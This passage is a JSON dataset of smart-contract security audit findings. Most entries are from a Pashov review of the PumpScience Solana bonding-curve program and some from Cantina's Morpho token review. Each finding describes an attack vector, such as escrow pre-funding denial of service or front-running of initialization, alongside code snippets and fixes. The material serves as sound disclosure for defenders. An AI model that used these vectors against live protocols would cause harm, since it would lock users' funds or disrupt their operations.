      "title": "[H-02] Bonding Curve DOS through escrow pre-funding",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe sol_escrow account can be preemptively funded with SOL by an attacker before the bonding curve is created. Since the `create_bonding_curve` instruction initializes `real_sol_reserves` to 0, but the invariant check verifies that the actual SOL balance matches this value, the presence of any SOL in the escrow account will cause the curve creation to fail.\n\nThis is possible because:\n\n- The sol_escrow PDA address is deterministic and can be calculated by anyone who knows the mint address\n- Anyone can send SOL to this address before the curve is created\n- The invariant strictly enforces `sol_escrow_lamports == real_sol_reserves`\n\nCode snippets:\n\n```rust\n// In create_bonding_curve.rs\npub fn handler(ctx: Context<CreateBondingCurve>, params: CreateBondingCurveParams) -> Result<()> {\n    // real_sol_reserves initialized to 0\n    ctx.accounts.bonding_curve.update_from_params(...);\n\n    // Invariant check will fail if escrow has SOL\n    BondingCurve::invariant(locker)?;\n}\n\n// In curve.rs\npub fn invariant<'info>(ctx: &mut BondingCurveLockerCtx<'info>) -> Result<()> {\n    if sol_escrow_lamports != bonding_curve.real_sol_reserves {\n        return Err(ContractError::BondingCurveInvariant.into());\n    }\n}\n```\n\n## Recommendations\n\nInitialize `real_sol_reserves` to match any existing SOL balance in the escrow during creation.\n\nIf that's not desirable, add a SOL sweep mechanism during curve creation that transfers any existing SOL to the creator, for example:\n\n- Check if there's any existing SOL in the escrow\n- If found, sweep it to the creator/admin using a signed CPI\n- Then continue with regular curve creation",
      "summary": "\nThe bug report states that an attacker can fund the sol_escrow account with SOL before the bonding curve is created. This is possible because the account's address can be calculated by anyone who knows the mint address, and anyone can send SOL to this address before the curve is created. The code also has an invariant check that will fail if SOL is present in the escrow account. To fix this, it is recommended to either initialize the `real_sol_reserves` value to match any existing SOL balance in the account during creation, or to add a mechanism that will transfer any existing SOL to the creator or administrator before continuing with curve creation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45296",
      "title": "[H-01] Direct SOL transfers to bonding curve escrow can break protocol invariant",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe bonding curve protocol maintains an invariant that the `real_sol_reserves` state variable must exactly match the SOL balance (lamports) in the `bonding_curve_sol_escrow` account. This invariant is checked at the end of every swap operation:\n\n```rust\nif sol_escrow_lamports != bonding_curve.real_sol_reserves {\n    msg!(\n        \"real_sol_r:{}, bonding_lamps:{}\",\n        bonding_curve.real_sol_reserves,\n        sol_escrow_lamports\n    );\n    msg!(\"Invariant failed: real_sol_reserves != bonding_curve_pool_lamports\");\n    return Err(ContractError::BondingCurveInvariant.into());\n}\n```\n\nHowever, the `real_sol_reserves` is only updated during swap operations, while the escrow account's SOL balance can be modified externally through direct transfers. An external SOL transfer to the escrow would increase `sol_escrow_lamports` without updating `real_sol_reserves`, causing the invariant check to fail and making the protocol unusable until fixed.\n\nNote: check the other issue \"DOS Attack Vector on Bonding Curve Creation Through Escrow Pre-funding\" as it is similiar.\n\n## Recommendations\n\nAdd a cleanup function that can synchronize `real_sol_reserves` with the actual lamport balance if needed.",
      "summary": "\nThis bug report discusses a problem with the bonding curve protocol. The protocol has a rule that the amount of SOL in the `bonding_curve_sol_escrow` account must match the `real_sol_reserves` state variable. However, this rule is only checked during swap operations and does not account for external transfers to the escrow account. This can cause the protocol to stop working until fixed. The report recommends adding a function to synchronize the `real_sol_reserves` with the actual SOL balance in the escrow account.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45295",
      "title": "[C-01] Lock pool can be DoSed",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nIn the lock_pool instruction, the creation of an Associated Token Account (ATA) for LP tokens relies on checking the lamport balance to determine if the account exists. The check `ctx.accounts.escrow_vault.get_lamports() == 0` is used to decide whether to create the ATA.\n\n```rust\nif ctx.accounts.escrow_vault.get_lamports() == 0 {\n    associated_token::create(CpiContext::new(\n        ctx.accounts.associated_token_program.to_account_info(),\n        associated_token::Create {\n            payer: ctx.accounts.payer.to_account_info(),\n            associated_token: ctx.accounts.escrow_vault.to_account_info(),\n            authority: ctx.accounts.lock_escrow.to_account_info(),\n            mint: ctx.accounts.lp_mint.to_account_info(),\n            token_program: ctx.accounts.token_program.to_account_info(),\n            system_program: ctx.accounts.system_program.to_account_info(),\n        },\n    ))?;\n}\n```\n\n[programs/pump-science/src/instructions/migration/lock_pool.rs#L157](https://github.com/moleculeprotocol/pump-science-contract/blob/main/programs/pump-science/src/instructions/migration/lock_pool.rs#L157)\n\nThis is problematic because:\n\n- An attacker can prevent ATA creation by sending SOL to the escrow_vault address beforehand\n- Having SOL in an address doesn't guarantee a properly initialized Token Account\n- Without a properly initialized ATA, the locking mechanism would fail since there would be no valid token account to receive the LP tokens\n\nAs a result, the lock pool would be DoSed.\n\n## Recommendations\n\nReplace the current implementation with `create_idempotent` which safely handles ATA creation regardless of lamport balance.",
      "summary": "\nThe bug report discusses an issue with the lock_pool instruction in a program called pump-science. The severity and likelihood of the bug are both high. The problem lies in the creation of an Associated Token Account (ATA) for LP tokens, which is done by checking the lamport balance of the escrow_vault account. This check is used to determine if the ATA needs to be created. However, this approach is problematic as it can be exploited by an attacker who sends SOL to the escrow_vault address beforehand, preventing the creation of the ATA. This can lead to a denial of service (DoS) attack on the lock pool. The report recommends replacing the current implementation with a safer method called `create_idempotent` which can handle ATA creation regardless of the lamport balance. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45126",
      "title": "[L-05] The Global Account may be initialized early by the attacker",
      "impact": "LOW",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Low\n\n## Description\n\nThe Global Account uses a fixed string (Global::SEED_PREFIX\n) as its seeds, and anyone can call the initialization function as long as `global.initialized` is not set.\n\n```rust\n#[event_cpi]\n#[derive(Accounts)]\n#[instruction(params: GlobalSettingsInput)]\npub struct Initialize<'info> {\n    #[account(mut)]\n    authority: Signer<'info>,\n\n    #[account(\n        init,\n        space = 8 + Global::INIT_SPACE,\n@>    seeds = [Global::SEED_PREFIX.as_bytes()],\n@>    constraint = global.initialized != true @ ContractError::AlreadyInitialized,\n        bump,\n        payer = authority,\n    )]\n    global: Box<Account<'info, Global>>,\n\n    system_program: Program<'info, System>,\n}\n\nimpl Initialize<'_> {\n    pub fn handler(ctx: Context<Initialize>, params: GlobalSettingsInput) -> Result<()> {\n        let global = &mut ctx.accounts.global;\n        global.update_authority(GlobalAuthorityInput {\n            global_authority: Some(ctx.accounts.authority.key()),\n            migration_authority: Some(ctx.accounts.authority.key()),\n        });\n        global.update_settings(params.clone());\n\n        require_gt!(global.mint_decimals, 0, ContractError::InvalidArgument);\n\n        global.initialized = true;\n        emit_cpi!(global.into_event());\n        Ok(())\n    }\n}\n```\n\nTherefore, an attacker can preemptively call the initialization function to set its own address as the administrator. As a result, the Global Account cannot be reset.\n\n## Recommendations\n\nCall the signer's address as seeds, or just run the fixed address call initialization function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45125",
      "title": "[L-04] Insufficient Token Account validation in pool initialization",
      "impact": "LOW",
      "content": "Several token accounts in the `InitializePoolWithConfig` instruction lack proper ownership and mint relationship validation, relying on `UncheckedAccount` instead of proper token account validation. This could allow to pass incorrect token accounts.\n\nThe current implementation uses `UncheckedAccount` for multiple token-related accounts:\n\n```rust\n#[derive(Accounts)]\npub struct InitializePoolWithConfig<'info> {\n    #[account(mut)]\n    /// CHECK: Token A LP\n    pub a_vault_lp: UncheckedAccount<'info>,\n\n    #[account(mut)]\n    /// CHECK: Vault LP accounts and mints for token A\n    pub a_token_vault: UncheckedAccount<'info>,\n\n    // ... other unchecked token accounts\n}\n```\n\nThis lacks validation for:\n\n1. Token account ownership verification\n2. Mint relationship verification\n3. Type safety provided by Anchor's account validation\n\nAdd proper token account validation:\n\n```rust\n#[derive(Accounts)]\npub struct InitializePoolWithConfig<'info> {\n    #[account(\n        mut,\n        constraint = a_vault_lp.owner == vault_program.key() @ ContractError::InvalidOwner,\n        constraint = a_vault_lp.mint == a_vault_lp_mint.key() @ ContractError::InvalidMint\n    )]\n    pub a_vault_lp: Box<Account<'info, TokenAccount>>,\n\n    #[account(\n        mut,\n        constraint = a_token_vault.owner == vault_program.key() @ ContractError::InvalidOwner,\n        constraint = a_token_vault.mint == token_a_mint.key() @ ContractError::InvalidMint\n    )]\n    pub a_token_vault: Box<Account<'info, TokenAccount>>,\n\n    // Similar changes for other token accounts\n}\n```\n\nAdd new error variants:\n\n```rust\n#[error_code]\npub enum ContractError {\n    #[msg(\"Invalid token account owner\")]\n    InvalidOwner,\n\n    #[msg(\"Invalid token account mint\")]\n    InvalidMint,\n}\n```\n\nApply similar validation to all token accounts:\n\n- Vault LP accounts (a_vault_lp, b_vault_lp)\n- Token vault accounts (a_token_vault, b_token_vault)\n- Payer token accounts (payer_token_a, payer_token_b)\n- Protocol fee accounts (protocol_token_a_fee, protocol_token_b_fee)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45124",
      "title": "[L-03] State Inconsistency Due to Solana Rollback",
      "impact": "LOW",
      "content": "One function in the protocol is vulnerable to state inconsistencies in the event of a Solana rollback:\n\n1. **Setting Config Parameters**:\n   - Global configuration parameters could become outdated during a Solana rollback\n   - Protocol could operate with old, invalid settings\n   - Potential for system malfunction or vulnerabilities\n\nRecommendation:\n\n1. **Detect Outdated Configurations**\n\n   - Utilize the `LastRestartSlot` sysvar to check configuration validity\n   - Automatically pause protocol if the configuration is outdated\n   - Require admin intervention before resuming operations\n\n2. **Add last_updated_slot Field**\n\n   - Include tracking field in bonding curve state\n   - Monitor configuration update timestamps\n\n3. **Implement Outdated Configuration Check**\n   ```rust\n   fn is_config_outdated(global: &Global) -> Result<bool> {\n       let last_restart_slot = LastRestartSlot::get()?;\n       Ok(global.last_updated_slot <= last_restart_slot.last_restart_slot)\n   }\n   ```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45123",
      "title": "[L-02] Insufficient validation in global parameter updates",
      "impact": "LOW",
      "content": "The `set_params` function allows updating protocol parameters without proper validation:\n\n```rust\npub fn set_params(ctx: Context<SetParams>, params: GlobalSettingsInput) -> Result<()> {\n    SetParams::handler(ctx, params)\n}\n```\n\nLooking at the `GlobalSettingsInput` struct:\n\n```rust\npub struct GlobalSettingsInput {\n    pub initial_virtual_token_reserves: Option<u64>,\n    pub initial_virtual_sol_reserves: Option<u64>,\n    pub initial_real_token_reserves: Option<u64>,\n    pub token_total_supply: Option<u64>,\n    pub mint_decimals: Option<u8>,\n    pub migrate_fee_amount: Option<u64>,\n    pub migration_token_allocation: Option<u64>,\n    pub fee_receiver: Option<Pubkey>,\n    pub whitelist_enabled: Option<bool>,\n    pub meteora_config: Option<Pubkey>,\n}\n```\n\nConsider adding comprehensive parameter validation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45122",
      "title": "[L-01] Insufficient SOL balance check ignores rent exemption",
      "impact": "LOW",
      "content": "In the swap function's buy tokens validation, the code only checks if the user's total SOL balance is sufficient for the swap amount, without considering rent exemption:\n\n```rust\nrequire!(\n    ctx.accounts.user.get_lamports() >= exact_in_amount,\n    ContractError::InsufficientUserSOL,\n);\n````\n\n[programs/pump-science/src/instructions/curve/swap.rs#L177](https://github.com/moleculeprotocol/pump-science-contract/blob/main/programs/pump-science/src/instructions/curve/swap.rs#L177)\n\nThis check uses `get_lamports()` which returns the total balance including the rent exemption amount. The transaction will succeed even if it depletes the account below rent exemption, causing the account to:\n\n- Enter a non-rent-exempt state\n- Get charged rent over time by the Solana runtime, eventually be purged if the balance is fully depleted.\n\nAdd a more comprehensive balance check that accounts for rent exemption:\n\n```rust\nlet rent = Rent::get()?;\nlet min_rent = rent.minimum_balance(0); // 0 for data size since this is just a native SOL account\nrequire!(\n    ctx.accounts.user.get_lamports() >= exact_in_amount.checked_add(min_rent).unwrap(),\n    ContractError::InsufficientUserSOL,\n);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45121",
      "title": "[M-02] DOS of CreateBondingCurve",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nThe `CreateBondingCurve` instruction requires passing `bonding_curve_token_account`:\n\n```rust\n    #[account(\n        init,\n        payer = creator,\n        associated_token::mint = mint,\n        associated_token::authority = bonding_curve,\n    )]\n    bonding_curve_token_account: Box<Account<'info, TokenAccount>>,\n```\n\n`bonding_curve_token_account` uses `associated_token::mint` and `associated_token::authority`, so the `TokenAccount` can be created in advance.\nIf this already exists, creating the function will fail because init is used.\n\nAn attacker can extract the calculated `bonding_curve` address and create a `TokenAccount` to prevent users from creating a Bonding Curve.\n\n## Recommendations\n\n````diff\n    #[account(\n-        init,\n+        init_if_needed,\n        payer = creator,\n        associated_token::mint = mint,\n        associated_token::authority = bonding_curve,\n    )]\n    bonding_curve_token_account: Box<Account<'info, TokenAccount>>,```",
      "summary": "\nThe bug report is about a medium severity bug in a function called `CreateBondingCurve`. The function requires passing a variable called `bonding_curve_token_account`, which uses two other variables called `associated_token::mint` and `associated_token::authority`. This means that the `TokenAccount` can be created beforehand and if it already exists, the function will fail. This can be exploited by an attacker to prevent users from creating a Bonding Curve. The recommendation is to change the `init` parameter to `init_if_needed` to prevent this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45120",
      "title": "[M-01] Start slot validation allows past slots",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nThe protocol implements a fee schedule that should progress from high fees (99%) to low fees (1%) over time based on slots passed since launch. However, the current implementation validates the `start_slot` parameter incorrectly:\n\n```rust\npub fn validate(&self, params: &CreateBondingCurveParams) -> Result<()> {\n    let clock = Clock::get()?;\n    // validate start time\n    if let Some(start_slot) = params.start_slot {\n        require!(start_slot <= clock.slot, ContractError::InvalidStartTime)\n    }\n    // ...\n}\n```\n\nThis validation only ensures the start_slot is not in the future (`start_slot <= clock.slot`), meaning creators can set a start slot far in the past. This breaks the intended fee progression since `slots_passed = current_slot - start_slot` would immediately start at a later fee stage.\n\nFor example:\nThe current slot is 1000\n\n- Creator sets start_slot to 800\n  The first trade occurs at slot 1000, slots_passed = 1000 - 800 = 200\n- This means trading starts in Phase 2 (~5% fee) instead of Phase 1 (99% fee)\n\n## Recommendations\n\nThe start slot validation should be updated to only allow start slots within a small range of the current slot, ensuring the fee schedule starts from Phase 1 as intended.",
      "summary": "\nThe report describes a bug in a protocol that is causing the fee schedule to start at a lower fee than intended. The bug occurs because the validation for the start slot parameter is only checking if it is in the future, not if it is within a small range of the current slot. This means that creators can set a start slot far in the past, causing the fee schedule to start at a later stage. The recommendation is to update the validation to only allow start slots within a small range of the current slot to ensure the fee schedule starts at the correct fee.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45119",
      "title": "[H-03] Unused freeze authority revocation creates token cock risk",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe codebase includes a `revoke_freeze_authority` function in `locker.rs` that is not being called during pool creation, despite being necessary to prevent tokens from being frozen after migration.\n\nIf the freeze authority is not revoked:\n\n- The bonding curve program retains the ability to freeze token accounts\n- This could potentially be used to lock user tokens after migration\n- Goes against the intended design where locking should only be possible during pre-trading\n\n**Code Location :** [locker.rs#L83](https://github.com/moleculeprotocol/pump-science-contract/blob/54daf1b93cf6abf955c69f043f73b4df671f97f7/programs/pump-science/src/state/bonding_curve/locker.rs#L83)\n\n## Recommendations\n\nIt's recommended that the freeze authority revocation call be added.",
      "summary": "\nA function in the codebase called `revoke_freeze_authority` is not being used when creating a pool, which can cause issues with token freezing after migration. This can give the program the ability to lock user tokens, which goes against the intended design. It is recommended to add the freeze authority revocation call to prevent this issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45118",
      "title": "[H-02] Bonding Curve DOS through escrow pre-funding",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe sol_escrow account can be preemptively funded with SOL by an attacker before the bonding curve is created. Since the `create_bonding_curve` instruction initializes `real_sol_reserves` to 0, but the invariant check verifies that the actual SOL balance matches this value, the presence of any SOL in the escrow account will cause the curve creation to fail.\n\nThis is possible because:\n\n- The sol_escrow PDA address is deterministic and can be calculated by anyone who knows the mint address\n- Anyone can send SOL to this address before the curve is created\n- The invariant strictly enforces `sol_escrow_lamports == real_sol_reserves`\n\nCode snippets:\n\n```rust\n// In create_bonding_curve.rs\npub fn handler(ctx: Context<CreateBondingCurve>, params: CreateBondingCurveParams) -> Result<()> {\n    // real_sol_reserves initialized to 0\n    ctx.accounts.bonding_curve.update_from_params(...);\n\n    // Invariant check will fail if escrow has SOL\n    BondingCurve::invariant(locker)?;\n}\n\n// In curve.rs\npub fn invariant<'info>(ctx: &mut BondingCurveLockerCtx<'info>) -> Result<()> {\n    if sol_escrow_lamports != bonding_curve.real_sol_reserves {\n        return Err(ContractError::BondingCurveInvariant.into());\n    }\n}\n```\n\n## Recommendations\n\nInitialize `real_sol_reserves` to match any existing SOL balance in the escrow during creation.\n\nIf that's not desirable, add a SOL sweep mechanism during curve creation that transfers any existing SOL to the creator, for example:\n\n- Check if there's any existing SOL in the escrow\n- If found, sweep it to the creator/admin using a signed CPI\n- Then continue with regular curve creation",
      "summary": "\nThe report describes a bug in a program that allows an attacker to fund an account with a cryptocurrency called SOL before the program has finished setting up a specific feature called a \"bonding curve\". This is possible because the program does not account for any SOL that may already be in the account when it is setting up the bonding curve. The report recommends fixing this bug by either initializing the account's SOL balance to match any existing SOL balance or by creating a mechanism to transfer any existing SOL to the creator of the program before setting up the bonding curve.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45117",
      "title": "[H-01] Direct SOL transfers to bonding curve escrow can break protocol invariant",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\n\nThe bonding curve protocol maintains an invariant that the `real_sol_reserves` state variable must exactly match the SOL balance (lamports) in the `bonding_curve_sol_escrow` account. This invariant is checked at the end of every swap operation:\n\n```rust\nif sol_escrow_lamports != bonding_curve.real_sol_reserves {\n    msg!(\n        \"real_sol_r:{}, bonding_lamps:{}\",\n        bonding_curve.real_sol_reserves,\n        sol_escrow_lamports\n    );\n    msg!(\"Invariant failed: real_sol_reserves != bonding_curve_pool_lamports\");\n    return Err(ContractError::BondingCurveInvariant.into());\n}\n```\n\nHowever, the `real_sol_reserves` is only updated during swap operations, while the escrow account's SOL balance can be modified externally through direct transfers. An external SOL transfer to the escrow would increase `sol_escrow_lamports` without updating `real_sol_reserves`, causing the invariant check to fail and making the protocol unusable until fixed.\n\nNote: check the other issue \"DOS Attack Vector on Bonding Curve Creation Through Escrow Pre-funding\" as it is similiar.\n\n## Recommendations\n\nAdd a cleanup function that can synchronize `real_sol_reserves` with the actual lamport balance if needed.",
      "summary": "\nThis bug report discusses a problem with the bonding curve protocol. The protocol is designed to maintain a balance between the `real_sol_reserves` state variable and the SOL balance in the `bonding_curve_sol_escrow` account. However, this balance can be disrupted if the SOL balance in the escrow account is modified externally through direct transfers. This can cause the protocol to become unusable until fixed. The report suggests adding a cleanup function to synchronize the `real_sol_reserves` with the actual SOL balance in the escrow account.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "45116",
      "title": "[C-01] Lock pool can be DoSed",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nIn the lock_pool instruction, the creation of an Associated Token Account (ATA) for LP tokens relies on checking the lamport balance to determine if the account exists. The check `ctx.accounts.escrow_vault.get_lamports() == 0` is used to decide whether to create the ATA.\n\n```rust\nif ctx.accounts.escrow_vault.get_lamports() == 0 {\n    associated_token::create(CpiContext::new(\n        ctx.accounts.associated_token_program.to_account_info(),\n        associated_token::Create {\n            payer: ctx.accounts.payer.to_account_info(),\n            associated_token: ctx.accounts.escrow_vault.to_account_info(),\n            authority: ctx.accounts.lock_escrow.to_account_info(),\n            mint: ctx.accounts.lp_mint.to_account_info(),\n            token_program: ctx.accounts.token_program.to_account_info(),\n            system_program: ctx.accounts.system_program.to_account_info(),\n        },\n    ))?;\n}\n```\n\n[programs/pump-science/src/instructions/migration/lock_pool.rs#L157](https://github.com/moleculeprotocol/pump-science-contract/blob/main/programs/pump-science/src/instructions/migration/lock_pool.rs#L157)\n\nThis is problematic because:\n\n- An attacker can prevent ATA creation by sending SOL to the escrow_vault address beforehand\n- Having SOL in an address doesn't guarantee a properly initialized Token Account\n- Without a properly initialized ATA, the locking mechanism would fail since there would be no valid token account to receive the LP tokens\n\nAs a result, the lock pool would be DoSed.\n\n## Recommendations\n\nReplace the current implementation with `create_idempotent` which safely handles ATA creation regardless of lamport balance.",
      "summary": "\nThe bug report is about a problem in the lock_pool instruction, where the creation of an Associated Token Account (ATA) for LP tokens is not properly handled. This can lead to a denial-of-service attack, as an attacker can prevent the creation of the ATA by sending SOL to the escrow_vault address beforehand. The report recommends replacing the current implementation with a safer method that can handle ATA creation regardless of the lamport balance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "PumpScience_2024-12-24",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/PumpScience-security-review_2024-12-24.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "46605",
      "title": "Use init functions provided by the Open-Zeppelin contracts ",
      "impact": "LOW",
      "content": "## Code Review for MorphoToken Contracts\n\n## Context\n- **Files**: \n  - MorphoTokenEthereum.sol (Lines 30-35)\n  - MorphoTokenOptimism.sol (Lines 65-70)\n\n## Description\nIn this context, one can use the `__Ownable_init(owner)` instead of inlining the same logic using:\n\n```solidity\nrequire(owner != address(0), ZeroAddress());\n// ...\n_transferOwnership(owner);\n```\n\n## Recommendation\nApply the following patch:\n\n### MorphoTokenEthereum.sol\n```diff\ndiff --git a/src/MorphoTokenEthereum.sol b/src/MorphoTokenEthereum.sol\nindex 6e0dde3..67d4833 100644\n--- a/src/MorphoTokenEthereum.sol\n+++ b/src/MorphoTokenEthereum.sol\n@@ -27,12 +27,10 @@ contract MorphoTokenEthereum is DelegationToken {\n /// @param owner The new owner.\n /// @param wrapper The wrapper contract address to migrate legacy MORPHO tokens to the new one.\n function initialize(address owner, address wrapper) external initializer {\n- require(owner != address(0), ZeroAddress());\n-\n+ __Ownable_init(owner);\n __ERC20_init(NAME, SYMBOL);\n __ERC20Permit_init(NAME);\n- _transferOwnership(owner);\n _mint(wrapper, 1_000_000_000e18); // Mint 1B to the wrapper contract.\n }\n```\n\n### MorphoTokenOptimism.sol\n```diff\ndiff --git a/src/MorphoTokenOptimism.sol b/src/MorphoTokenOptimism.sol\nindex 8383588..1cd2d48 100644\n--- a/src/MorphoTokenOptimism.sol\n+++ b/src/MorphoTokenOptimism.sol\n@@ -62,12 +62,9 @@ contract MorphoTokenOptimism is DelegationToken, IOptimismMintableERC20 {\n /// @notice Initializes the contract.\n /// @param owner The new owner.\n function initialize(address owner) external initializer {\n- require(owner != address(0), ZeroAddress());\n-\n+ __Ownable_init(owner);\n __ERC20_init(NAME, SYMBOL);\n __ERC20Permit_init(NAME);\n-\n- _transferOwnership(owner);\n }\n /// @dev Allows the StandardBridge on this network to mint tokens.\n```\n\n## Additional Notes\n- **Morpho**: Fixed in commit `220dd096`.\n- **Cantina Managed**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46604",
      "title": "Typo in the DelegationToken ",
      "impact": "LOW",
      "content": "## Context\n**File:** DelegationToken.sol#L134\n\n## Description\nThe `DelegationToken _update` function contains a typo in the comment:\n\n```solidity\n/// @dev Emits a {IDelegates-DelegateVotesChanged} event.\n```\n\nThe function actually emits `DelegatedVotingPowerChanged` and there is no `IDelegates` interface; the interface is called `IDelegation`.\n\n## Recommendation\nConsider modifying the comment to reflect the correct event emitted:\n\n```solidity\n/// @dev Emits a {DelegatedVotingPowerChanged} event.\n```\n\n## Morpho\nFixed in PR 77.\n\n## Cantina Managed\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46603",
      "title": "Missing version eld in the MorphoTokenEthereum and MorphoTokenOptimism ",
      "impact": "LOW",
      "content": "## Context\n- `MorphoTokenEthereum.sol#L20`\n- `MorphoTokenOptimism.sol#L30`\n\n## Description\nWhen an upgradable contract is defined, it is customary to define a version field in the implementation which will specify the current version. This field is usually incremented with every upgrade. The `MorphoTokenEthereum` and `MorphoTokenOptimism` are currently missing this field.\n\n## Recommendation\nConsider adding a string public constant `version = \"1\";` field for the first version of the implementation.\n\n## Responses\n**Morpho:** Acknowledged. We don't plan on deploying other versions, so we'd rather not touch the version parameter.\n\n**Cantina Managed:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46602",
